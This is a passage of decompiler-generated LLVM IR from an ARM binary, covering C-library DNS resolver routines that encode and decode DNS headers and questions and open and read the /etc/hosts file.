  store i32 %v0_20c28, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_20c34 = icmp sgt i32 %arg3, 11
  br i1 %v7_20c34, label %dec_label_pc_20c3c, label %dec_label_pc_20d08

dec_label_pc_20c3c:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_20c3c = add i32 %tmp, 1
  %v2_20c3c = inttoptr i32 %v1_20c3c to i8*
  %v3_20c3c = load i8, i8* %v2_20c3c, align 1
  store i8 %v3_20c3c, i8* %tmp16, align 1
  %v0_20c44 = load i32, i32* @ip, align 4
  %v1_20c44 = inttoptr i32 %v0_20c44 to i32*
  %v2_20c44 = load i32, i32* %v1_20c44, align 4
  %v1_20c48 = trunc i32 %v2_20c44 to i8
  %v4_20c48 = add i32 %arg2, 1
  %v5_20c48 = inttoptr i32 %v4_20c48 to i8*
  store i8 %v1_20c48, i8* %v5_20c48, align 1
  %v0_20c4c = load i32, i32* @ip, align 4
  %v1_20c4c = add i32 %v0_20c4c, 8
  %v2_20c4c = inttoptr i32 %v1_20c4c to i32*
  %v3_20c4c = load i32, i32* %v2_20c4c, align 4
  %v1_20c50 = add i32 %v0_20c4c, 20
  %v2_20c50 = inttoptr i32 %v1_20c50 to i32*
  %v3_20c50 = load i32, i32* %v2_20c50, align 4
  %v1_20c54 = add i32 %v0_20c4c, 4
  %v2_20c54 = inttoptr i32 %v1_20c54 to i32*
  %v3_20c54 = load i32, i32* %v2_20c54, align 4
  %v1_20c58 = add i32 %v0_20c4c, 12
  %v2_20c58 = inttoptr i32 %v1_20c58 to i32*
  %v3_20c58 = load i32, i32* %v2_20c58, align 4
  %v2_20c5c = icmp eq i32 %v3_20c50, 0
  br i1 %v2_20c5c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_20c3c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_20c3c, %bb
  %v0_20c6c = phi i32 [ 0, %dec_label_pc_20c3c ], [ 1, %bb ]
  %v1_20c64 = urem i32 %v3_20c4c, 16
  %v2_20c68 = icmp eq i32 %v3_20c54, 0
  %v4_20c6c = mul nuw nsw i32 %v1_20c64, 8
  %v5_20c6c = or i32 %v0_20c6c, %v4_20c6c
  %v1_20c70 = add i32 %v0_20c4c, 16
  %v2_20c70 = inttoptr i32 %v1_20c70 to i32*
  %v3_20c70 = load i32, i32* %v2_20c70, align 4
  %. = select i1 %v2_20c68, i32 0, i32 128
  %v2_20c7c = icmp eq i32 %v3_20c58, 0
  %storemerge11 = select i1 %v2_20c7c, i32 0, i32 4
  %v2_20c88 = or i32 %v5_20c6c, %.
  %v2_20c8c = icmp eq i32 %v3_20c70, 0
  %.26 = select i1 %v2_20c8c, i32 0, i32 2
  %v2_20c98 = or i32 %v2_20c88, %storemerge11
  %v2_20c9c = or i32 %v2_20c98, %.26
  %v1_20ca0 = trunc i32 %v2_20c9c to i8
  %v2_20ca0 = load i32, i32* %lr.global-to-local, align 4
  %v3_20ca0 = add i32 %v2_20ca0, 2
  %v4_20ca0 = inttoptr i32 %v3_20ca0 to i8*
  store i8 %v1_20ca0, i8* %v4_20ca0, align 1
  %v0_20ca4 = load i32, i32* @ip, align 4
  %v1_20ca4 = add i32 %v0_20ca4, 24
  %v1_20ca8 = inttoptr i32 %v1_20ca4 to i32*
  %v2_20ca8 = load i32, i32* %v1_20ca8, align 4
  %v3_20ca8 = add i32 %v0_20ca4, 28
  %v4_20ca8 = inttoptr i32 %v3_20ca8 to i32*
  %v5_20ca8 = load i32, i32* %v4_20ca8, align 4
  %v2_20cac = icmp eq i32 %v2_20ca8, 0
  %v1_20cb0 = urem i32 %v5_20ca8, 16
  %v0_20cbc = select i1 %v2_20cac, i32 0, i32 128
  %v2_20cbc = or i32 %v1_20cb0, %v0_20cbc
  %v1_20cc0 = trunc i32 %v2_20cbc to i8
  %v2_20cc0 = load i32, i32* %lr.global-to-local, align 4
  %v3_20cc0 = add i32 %v2_20cc0, 3
  %v4_20cc0 = inttoptr i32 %v3_20cc0 to i8*
  store i8 %v1_20cc0, i8* %v4_20cc0, align 1
  %v0_20cc4 = load i32, i32* @ip, align 4
  %v1_20cc4 = add i32 %v0_20cc4, 33
  %v2_20cc4 = inttoptr i32 %v1_20cc4 to i8*
  %v3_20cc4 = load i8, i8* %v2_20cc4, align 1
  %v2_20cc8 = load i32, i32* %lr.global-to-local, align 4
  %v3_20cc8 = add i32 %v2_20cc8, 4
  %v4_20cc8 = inttoptr i32 %v3_20cc8 to i8*
  store i8 %v3_20cc4, i8* %v4_20cc8, align 1
  %v0_20ccc = load i32, i32* @ip, align 4
  %v1_20ccc = add i32 %v0_20ccc, 32
  %v2_20ccc = inttoptr i32 %v1_20ccc to i32*
  %v3_20ccc = load i32, i32* %v2_20ccc, align 4
  %v1_20cd0 = trunc i32 %v3_20ccc to i8
  %v2_20cd0 = load i32, i32* %lr.global-to-local, align 4
  %v3_20cd0 = add i32 %v2_20cd0, 5
  %v4_20cd0 = inttoptr i32 %v3_20cd0 to i8*
  store i8 %v1_20cd0, i8* %v4_20cd0, align 1
  %v0_20cd4 = load i32, i32* @ip, align 4
  %v1_20cd4 = add i32 %v0_20cd4, 37
  %v2_20cd4 = inttoptr i32 %v1_20cd4 to i8*
  %v3_20cd4 = load i8, i8* %v2_20cd4, align 1
  %v2_20cd8 = load i32, i32* %lr.global-to-local, align 4
  %v3_20cd8 = add i32 %v2_20cd8, 6
  %v4_20cd8 = inttoptr i32 %v3_20cd8 to i8*
  store i8 %v3_20cd4, i8* %v4_20cd8, align 1
  %v0_20cdc = load i32, i32* @ip, align 4
  %v1_20cdc = add i32 %v0_20cdc, 36
  %v2_20cdc = inttoptr i32 %v1_20cdc to i32*
  %v3_20cdc = load i32, i32* %v2_20cdc, align 4
  %v1_20ce0 = trunc i32 %v3_20cdc to i8
  %v2_20ce0 = load i32, i32* %lr.global-to-local, align 4
  %v3_20ce0 = add i32 %v2_20ce0, 7
  %v4_20ce0 = inttoptr i32 %v3_20ce0 to i8*
  store i8 %v1_20ce0, i8* %v4_20ce0, align 1
  %v0_20ce4 = load i32, i32* @ip, align 4
  %v1_20ce4 = add i32 %v0_20ce4, 41
  %v2_20ce4 = inttoptr i32 %v1_20ce4 to i8*
  %v3_20ce4 = load i8, i8* %v2_20ce4, align 1
  %v2_20ce8 = load i32, i32* %lr.global-to-local, align 4
  %v3_20ce8 = add i32 %v2_20ce8, 8
  %v4_20ce8 = inttoptr i32 %v3_20ce8 to i8*
  store i8 %v3_20ce4, i8* %v4_20ce8, align 1
  %v0_20cec = load i32, i32* @ip, align 4
  %v1_20cec = add i32 %v0_20cec, 40
  %v2_20cec = inttoptr i32 %v1_20cec to i32*
  %v3_20cec = load i32, i32* %v2_20cec, align 4
  %v1_20cf0 = trunc i32 %v3_20cec to i8
  %v2_20cf0 = load i32, i32* %lr.global-to-local, align 4
  %v3_20cf0 = add i32 %v2_20cf0, 9
  %v4_20cf0 = inttoptr i32 %v3_20cf0 to i8*
  store i8 %v1_20cf0, i8* %v4_20cf0, align 1
  %v0_20cf4 = load i32, i32* @ip, align 4
  %v1_20cf4 = add i32 %v0_20cf4, 45
  %v2_20cf4 = inttoptr i32 %v1_20cf4 to i8*
  %v3_20cf4 = load i8, i8* %v2_20cf4, align 1
  %v2_20cf8 = load i32, i32* %lr.global-to-local, align 4
  %v3_20cf8 = add i32 %v2_20cf8, 10
  %v4_20cf8 = inttoptr i32 %v3_20cf8 to i8*
  store i8 %v3_20cf4, i8* %v4_20cf8, align 1
  %v0_20cfc = load i32, i32* @ip, align 4
  %v1_20cfc = add i32 %v0_20cfc, 44
  %v2_20cfc = inttoptr i32 %v1_20cfc to i32*
  %v3_20cfc = load i32, i32* %v2_20cfc, align 4
  %v1_20d00 = trunc i32 %v3_20cfc to i8
  %v2_20d00 = load i32, i32* %lr.global-to-local, align 4
  %v3_20d00 = add i32 %v2_20d00, 11
  %v4_20d00 = inttoptr i32 %v3_20d00 to i8*
  store i8 %v1_20d00, i8* %v4_20d00, align 1
  %v2_20d08.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_20d08

dec_label_pc_20d08:                               ; preds = %entry, %bb17
  %v2_20d08 = phi i32 [ %v2_20d08.pre, %bb17 ], [ %v0_20c28, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_20d08, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_20c4c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_20d08, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_20d10 = load i8, i8* %arg1, align 1
  %v4_20d10 = zext i8 %v3_20d10 to i32
  %v2_20d14 = add i32 %tmp, 1
  %v3_20d14 = inttoptr i32 %v2_20d14 to i8*
  %v4_20d14 = load i8, i8* %v3_20d14, align 1
  %v5_20d14 = zext i8 %v4_20d14 to i32
  %v4_20d18 = mul nuw nsw i32 %v4_20d10, 256
  %v5_20d18 = or i32 %v5_20d14, %v4_20d18
  %v2_20d1c = inttoptr i32 %arg2 to i32*
  store i32 %v5_20d18, i32* %v2_20d1c, align 4
  %v2_20d20 = add i32 %tmp, 2
  %v3_20d20 = inttoptr i32 %v2_20d20 to i8*
  %v4_20d20 = load i8, i8* %v3_20d20, align 1
  %tmp3 = icmp slt i8 %v4_20d20, 0
  %v3_20d24 = zext i1 %tmp3 to i32
  %v2_20d28 = add i32 %arg2, 4
  %v3_20d28 = inttoptr i32 %v2_20d28 to i32*
  store i32 %v3_20d24, i32* %v3_20d28, align 4
  %v4_20d2c = load i8, i8* %v3_20d20, align 1
  %div = udiv i8 %v4_20d2c, 8
  %tmp4 = urem i8 %div, 16
  %v1_20d34 = zext i8 %tmp4 to i32
  %v2_20d38 = add i32 %arg2, 8
  %v3_20d38 = inttoptr i32 %v2_20d38 to i32*
  store i32 %v1_20d34, i32* %v3_20d38, align 4
  %v4_20d3c = load i8, i8* %v3_20d20, align 1
  %div1 = udiv i8 %v4_20d3c, 4
  %tmp5 = urem i8 %div1, 2
  %v1_20d44 = zext i8 %tmp5 to i32
  %v2_20d48 = add i32 %arg2, 12
  %v3_20d48 = inttoptr i32 %v2_20d48 to i32*
  store i32 %v1_20d44, i32* %v3_20d48, align 4
  %v4_20d4c = load i8, i8* %v3_20d20, align 1
  %div2 = udiv i8 %v4_20d4c, 2
  %tmp6 = urem i8 %div2, 2
  %v1_20d54 = zext i8 %tmp6 to i32
  %v2_20d58 = add i32 %arg2, 16
  %v3_20d58 = inttoptr i32 %v2_20d58 to i32*
  store i32 %v1_20d54, i32* %v3_20d58, align 4
  %v4_20d5c = load i8, i8* %v3_20d20, align 1
  %tmp7 = urem i8 %v4_20d5c, 2
  %v1_20d60 = zext i8 %tmp7 to i32
  %v2_20d64 = add i32 %arg2, 20
  %v3_20d64 = inttoptr i32 %v2_20d64 to i32*
  store i32 %v1_20d60, i32* %v3_20d64, align 4
  %v2_20d68 = add i32 %tmp, 3
  %v3_20d68 = inttoptr i32 %v2_20d68 to i8*
  %v4_20d68 = load i8, i8* %v3_20d68, align 1
  %tmp8 = icmp slt i8 %v4_20d68, 0
  %v3_20d6c = zext i1 %tmp8 to i32
  %v2_20d70 = add i32 %arg2, 24
  %v3_20d70 = inttoptr i32 %v2_20d70 to i32*
  store i32 %v3_20d6c, i32* %v3_20d70, align 4
  %v4_20d74 = load i8, i8* %v3_20d68, align 1
  %tmp9 = urem i8 %v4_20d74, 16
  %v1_20d78 = zext i8 %tmp9 to i32
  %v2_20d7c = add i32 %arg2, 28
  %v3_20d7c = inttoptr i32 %v2_20d7c to i32*
  store i32 %v1_20d78, i32* %v3_20d7c, align 4
  %v2_20d80 = add i32 %tmp, 4
  %v3_20d80 = inttoptr i32 %v2_20d80 to i8*
  %v4_20d80 = load i8, i8* %v3_20d80, align 1
  %v5_20d80 = zext i8 %v4_20d80 to i32
  %v2_20d84 = add i32 %tmp, 5
  %v3_20d84 = inttoptr i32 %v2_20d84 to i8*
  %v4_20d84 = load i8, i8* %v3_20d84, align 1
  %v5_20d84 = zext i8 %v4_20d84 to i32
  %v4_20d88 = mul nuw nsw i32 %v5_20d80, 256
  %v5_20d88 = or i32 %v5_20d84, %v4_20d88
  %v2_20d8c = add i32 %arg2, 32
  %v3_20d8c = inttoptr i32 %v2_20d8c to i32*
  store i32 %v5_20d88, i32* %v3_20d8c, align 4
  %v2_20d90 = add i32 %tmp, 6
  %v3_20d90 = inttoptr i32 %v2_20d90 to i8*
  %v4_20d90 = load i8, i8* %v3_20d90, align 1
  %v5_20d90 = zext i8 %v4_20d90 to i32
  %v2_20d94 = add i32 %tmp, 7
  %v3_20d94 = inttoptr i32 %v2_20d94 to i8*
  %v4_20d94 = load i8, i8* %v3_20d94, align 1
  %v5_20d94 = zext i8 %v4_20d94 to i32
  %v4_20d98 = mul nuw nsw i32 %v5_20d90, 256
  %v5_20d98 = or i32 %v5_20d94, %v4_20d98
  %v2_20d9c = add i32 %arg2, 36
  %v3_20d9c = inttoptr i32 %v2_20d9c to i32*
  store i32 %v5_20d98, i32* %v3_20d9c, align 4
  %v2_20da0 = add i32 %tmp, 8
  %v3_20da0 = inttoptr i32 %v2_20da0 to i8*
  %v4_20da0 = load i8, i8* %v3_20da0, align 1
  %v5_20da0 = zext i8 %v4_20da0 to i32
  %v2_20da4 = add i32 %tmp, 9
  %v3_20da4 = inttoptr i32 %v2_20da4 to i8*
  %v4_20da4 = load i8, i8* %v3_20da4, align 1
  %v5_20da4 = zext i8 %v4_20da4 to i32
  %v4_20da8 = mul nuw nsw i32 %v5_20da0, 256
  %v5_20da8 = or i32 %v5_20da4, %v4_20da8
  %v2_20dac = add i32 %arg2, 40
  %v3_20dac = inttoptr i32 %v2_20dac to i32*
  store i32 %v5_20da8, i32* %v3_20dac, align 4
  %v2_20db0 = add i32 %tmp, 11
  %v3_20db0 = inttoptr i32 %v2_20db0 to i8*
  %v4_20db0 = load i8, i8* %v3_20db0, align 1
  %v5_20db0 = zext i8 %v4_20db0 to i32
  %v2_20db4 = add i32 %tmp, 10
  %v3_20db4 = inttoptr i32 %v2_20db4 to i8*
  %v4_20db4 = load i8, i8* %v3_20db4, align 1
  %v5_20db4 = zext i8 %v4_20db4 to i32
  %v4_20db8 = mul nuw nsw i32 %v5_20db4, 256
  %v5_20db8 = or i32 %v4_20db8, %v5_20db0
  %v2_20dbc = add i32 %arg2, 44
  %v3_20dbc = inttoptr i32 %v2_20dbc to i32*
  store i32 %v5_20db8, i32* %v3_20dbc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 11, { 13, 14, 7, 8, 15, 9, 10, 16, 24, 17, 4, 5, 6, 18, 19, 20, 21, 22, 23, 0, 11, 3, 2, 1, 12 }
  uselistorder i8 2, { 1, 2, 3, 4, 7, 5, 8, 6, 0, 10, 9 }
  uselistorder i8 4, { 2, 0, 1, 3 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5, 12 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_20dc4 = load i32, i32* @r4, align 4
  store i32 %v3_20dc4, i32* %stack_var_-16, align 4
  %v9_20dc4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_20dcc = load i32, i32* %arg1, align 4
  store i32 %v2_20dcc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_20dd8 = inttoptr i32 %v2_20dcc to i8*
  %v2_20dd8 = call i32 @__encode_dotted(i8* %v1_20dd8)
  store i32 %v2_20dd8, i32* %r0.global-to-local, align 4
  %v1_20ddc = icmp slt i32 %v2_20dd8, 0
  br i1 %v1_20ddc, label %dec_label_pc_20e1c, label %dec_label_pc_20de4

dec_label_pc_20de4:                               ; preds = %entry
  %v1_20de4 = load i32, i32* @r5, align 4
  %v2_20de4 = sub i32 %v1_20de4, %v2_20dd8
  %v7_20dec = icmp slt i32 %v2_20de4, 4
  br i1 %v7_20dec, label %bb, label %dec_label_pc_20df4

bb:                                               ; preds = %dec_label_pc_20de4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_20e1c

dec_label_pc_20df4:                               ; preds = %dec_label_pc_20de4
  %v0_20df4 = load i32, i32* @r4, align 4
  %v1_20df4 = add i32 %v0_20df4, 5
  %v2_20df4 = inttoptr i32 %v1_20df4 to i8*
  %v3_20df4 = load i8, i8* %v2_20df4, align 1
  %v2_20df8 = load i32, i32* @r6, align 4
  %v4_20df8 = add i32 %v2_20df8, %v2_20dd8
  %v5_20df8 = inttoptr i32 %v4_20df8 to i8*
  store i8 %v3_20df4, i8* %v5_20df8, align 1
  %v0_20dfc = load i32, i32* @r4, align 4
  %v1_20dfc = add i32 %v0_20dfc, 4
  %v2_20dfc = inttoptr i32 %v1_20dfc to i32*
  %v3_20dfc = load i32, i32* %v2_20dfc, align 4
  %v0_20e00 = load i32, i32* @r6, align 4
  %v1_20e00 = load i32, i32* %r0.global-to-local, align 4
  %v2_20e00 = add i32 %v1_20e00, %v0_20e00
  store i32 %v2_20e00, i32* %r2.global-to-local, align 4
  %v1_20e04 = trunc i32 %v3_20dfc to i8
  %v3_20e04 = add i32 %v2_20e00, 1
  %v4_20e04 = inttoptr i32 %v3_20e04 to i8*
  store i8 %v1_20e04, i8* %v4_20e04, align 1
  %v0_20e08 = load i32, i32* @r4, align 4
  %v1_20e08 = add i32 %v0_20e08, 9
  %v2_20e08 = inttoptr i32 %v1_20e08 to i8*
  %v3_20e08 = load i8, i8* %v2_20e08, align 1
  %v2_20e0c = load i32, i32* %r2.global-to-local, align 4
  %v3_20e0c = add i32 %v2_20e0c, 2
  %v4_20e0c = inttoptr i32 %v3_20e0c to i8*
  store i8 %v3_20e08, i8* %v4_20e0c, align 1
  %v0_20e10 = load i32, i32* @r4, align 4
  %v1_20e10 = add i32 %v0_20e10, 8
  %v2_20e10 = inttoptr i32 %v1_20e10 to i32*
  %v3_20e10 = load i32, i32* %v2_20e10, align 4
  %v1_20e14 = trunc i32 %v3_20e10 to i8
  %v2_20e14 = load i32, i32* %r2.global-to-local, align 4
  %v3_20e14 = add i32 %v2_20e14, 3
  %v4_20e14 = inttoptr i32 %v3_20e14 to i8*
  store i8 %v1_20e14, i8* %v4_20e14, align 1
  %v0_20e18 = load i32, i32* %r0.global-to-local, align 4
  %v1_20e18 = add i32 %v0_20e18, 4
  store i32 %v1_20e18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_20e1c

dec_label_pc_20e1c:                               ; preds = %bb, %entry, %dec_label_pc_20df4
  %v1_20e20 = phi i32 [ -1, %bb ], [ %v2_20dd8, %entry ], [ %v1_20e18, %dec_label_pc_20df4 ]
  %v2_20e1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_20e1c, i32* @r4, align 4
  store i32 %v9_20dc4, i32* @r6, align 4
  ret i32 %v1_20e20

; uselistorder directives
  uselistorder i32 %v2_20dd8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder label %dec_label_pc_20e1c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34536), i32* @r0, align 4
  %v1_20e3c = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34536))
  ret i32 %v1_20e3c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_20e54 = load i32, i32* @r4, align 4
  %v9_20e54 = load i32, i32* @r6, align 4
  %v12_20e54 = load i32, i32* @r7, align 4
  %v15_20e54 = load i32, i32* @r8, align 4
  %v18_20e54 = load i32, i32* @sb, align 4
  %v24_20e54 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  %v2_20e74 = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_20e74, align 4
  %v0_20e78 = load i32, i32* @r0, align 4
  store i32 %v0_20e78, i32* @r6, align 4
  %v0_20e7c = load i32, i32* @r1, align 4
  %v0_20e80 = load i32, i32* @r2, align 4
  store i32 %v0_20e80, i32* @r8, align 4
  %v0_20e84 = load i32, i32* @r3, align 4
  store i32 %v0_20e84, i32* @fp, align 4
  %v3_20e88 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_20e88, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_20e94

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_2104c

dec_label_pc_20e94:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_20e98 = icmp eq i32 %v0_20e78, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_20e98, label %dec_label_pc_20ea4, label %dec_label_pc_20ecc

dec_label_pc_20ea4:                               ; preds = %dec_label_pc_20e94
  %v0_20ea4 = call i32 @__open_etc_hosts()
  store i32 %v0_20ea4, i32* @r6, align 4
  %v2_20ea8 = icmp eq i32 %v0_20ea4, 0
  br i1 %v2_20ea8, label %dec_label_pc_20eb0, label %dec_label_pc_20ecc

dec_label_pc_20eb0:                               ; preds = %dec_label_pc_20ea4
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  store i32 70080, i32* %r3.global-to-local, align 4
  %v2_20eb8 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_20eb8, align 4
  %v0_20ebc = call i32 @__aeabi_read_tp()
  %v3_20ec0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_20ec0 = sext i16 %v3_20ec0 to i32
  store i32 %v4_20ec0, i32* %r3.global-to-local, align 4
  %v2_20ec4 = add i32 %v4_20ec0, %v0_20ebc
  %v3_20ec4 = inttoptr i32 %v2_20ec4 to i32*
  %v4_20ec4 = load i32, i32* %v3_20ec4, align 4
  store i32 %v4_20ec4, i32* @sb, align 4
  br label %dec_label_pc_2104c

dec_label_pc_20ecc:                               ; preds = %dec_label_pc_20ea4, %dec_label_pc_20e94
  %v1_20eec = phi i32 [ %v0_20ea4, %dec_label_pc_20ea4 ], [ %v0_20e78, %dec_label_pc_20e94 ]
  %v0_20ed0 = load i32, i32* @r4, align 4
  %v2_20ed0 = add i32 %v0_20ed0, -34524
  store i32 %v2_20ed0, i32* @r4, align 4
  %v2_20ed4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_20eec = add i32 %v1_20eec, 8
  %v3_20eec = inttoptr i32 %v2_20eec to i32*
  store i32 48, i32* %v3_20eec, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_20ef4 = load i32, i32* @r5, align 4
  %v1_20ef4 = add i32 %v0_20ef4, -48
  store i32 %v1_20ef4, i32* %r1.global-to-local, align 4
  %v0_20ef8 = load i32, i32* %ip.global-to-local, align 4
  %v1_20ef8 = add i32 %v0_20ef8, 24
  store i32 %v1_20ef8, i32* @ip, align 4
  %v0_20efc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_20efc, i32* @sb, align 4
  %v0_20f00 = load i32, i32* @lr, align 4
  %v1_20f00 = add i32 %v0_20f00, 32
  store i32 %v1_20f00, i32* @sl, align 4
  %v1_20f04 = load i32, i32* @r6, align 4
  %v2_20f04 = add i32 %v1_20f04, 16
  %v3_20f04 = inttoptr i32 %v2_20f04 to i32*
  store i32 %v1_20ef4, i32* %v3_20f04, align 4
  %v0_20f08 = load i32, i32* @r4, align 4
  %v0_20f0c = load i32, i32* @ip, align 4
  store i32 %v0_20f0c, i32* %stack_var_-64, align 4
  %v0_20f10 = load i32, i32* %r2.global-to-local, align 4
  %v1_20f10 = load i32, i32* %r3.global-to-local, align 4
  %v2_20f10 = inttoptr i32 %v1_20f10 to i32*
  store i32 %v0_20f10, i32* %v2_20f10, align 4
  %v0_20f14 = load i32, i32* @lr, align 4
  %v1_20f14 = load i32, i32* @r6, align 4
  %v2_20f14 = add i32 %v1_20f14, 4
  %v3_20f14 = inttoptr i32 %v2_20f14 to i32*
  store i32 %v0_20f14, i32* %v3_20f14, align 4
  %v2_20f44 = inttoptr i32 %v0_20e7c to i8*
  br label %dec_label_pc_21020

dec_label_pc_20f1c:                               ; preds = %dec_label_pc_21020
  %v3_20f1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_20f1c, i32* %r1.global-to-local, align 4
  %v0_20f20 = load i32, i32* @fp, align 4
  %v7_20f20 = icmp eq i32 %v0_20f20, 1
  %v1_20f24 = add i32 %v3_20f1c, 4
  store i32 %v1_20f24, i32* @r5, align 4
  %v1_20f28 = load i32, i32* @r7, align 4
  %v2_20f28 = add i32 %v1_20f28, 4
  %v3_20f28 = inttoptr i32 %v2_20f28 to i32*
  store i32 %v1_20f24, i32* %v3_20f28, align 4
  br i1 %v7_20f20, label %dec_label_pc_2104c, label %dec_label_pc_20f30

dec_label_pc_20f30:                               ; preds = %dec_label_pc_20f1c
  %v0_20f30 = load i32, i32* @fp, align 4
  %v7_20f30 = icmp eq i32 %v0_20f30, 2
  br i1 %v7_20f30, label %dec_label_pc_20f3c, label %dec_label_pc_20f70.preheader

dec_label_pc_20f70.preheader:                     ; preds = %dec_label_pc_20f30
  br label %dec_label_pc_20f54

dec_label_pc_20f3c:                               ; preds = %dec_label_pc_20f30
  %v0_20f3c = load i32, i32* %r1.global-to-local, align 4
  %v1_20f3c = inttoptr i32 %v0_20f3c to i32*
  %v2_20f3c = load i32, i32* %v1_20f3c, align 4
  store i32 %v2_20f3c, i32* @r1, align 4
  %v3_20f44 = call i32 @__GI_strcoll(i8* %v2_20f44, i32 %v2_20f3c)
  %v2_20f48 = icmp eq i32 %v3_20f44, 0
  br i1 %v2_20f48, label %dec_label_pc_20f80, label %dec_label_pc_21020

dec_label_pc_20f54:                               ; preds = %dec_label_pc_20f70.preheader, %dec_label_pc_20f70.backedge
  %v0_20f5c = phi i32 [ 0, %dec_label_pc_20f70.preheader ], [ %v0_20f70.be, %dec_label_pc_20f70.backedge ]
  %v0_20f54 = load i32, i32* @r5, align 4
  %v4_20f54 = mul i32 %v0_20f5c, 4
  %v5_20f54 = add i32 %v4_20f54, %v0_20f54
  %v6_20f54 = inttoptr i32 %v5_20f54 to i32*
  %v7_20f54 = load i32, i32* %v6_20f54, align 4
  store i32 %v7_20f54, i32* %r3.global-to-local, align 4
  store i32 %v7_20f54, i32* %r1.global-to-local, align 4
  %v2_20f58 = icmp eq i32 %v7_20f54, 0
  %v1_20f5c = add i32 %v0_20f5c, 1
  store i32 %v1_20f5c, i32* @r4, align 4
  br i1 %v2_20f58, label %dec_label_pc_20f70.backedge, label %dec_label_pc_20f64

dec_label_pc_20f70.backedge:                      ; preds = %dec_label_pc_20f54, %dec_label_pc_20f70thread-pre-split
  %v0_20f70.be = phi i32 [ %v0_20f70.pr, %dec_label_pc_20f70thread-pre-split ], [ %v1_20f5c, %dec_label_pc_20f54 ]
  %v7_20f78 = icmp sgt i32 %v0_20f70.be, 3
  br i1 %v7_20f78, label %dec_label_pc_21020, label %dec_label_pc_20f54

dec_label_pc_20f64:                               ; preds = %dec_label_pc_20f54
  %v3_20f64 = call i32 @__GI_strcasecmp(i8* %v2_20f44, i32 %v7_20f54)
  %v2_20f68 = icmp eq i32 %v3_20f64, 0
  br i1 %v2_20f68, label %dec_label_pc_20f80, label %dec_label_pc_20f70thread-pre-split

dec_label_pc_20f70thread-pre-split:               ; preds = %dec_label_pc_20f64
  %v0_20f70.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_20f70.backedge

dec_label_pc_20f80:                               ; preds = %dec_label_pc_20f64, %dec_label_pc_20f3c
  %v0_20f80 = load i32, i32* @r5, align 4
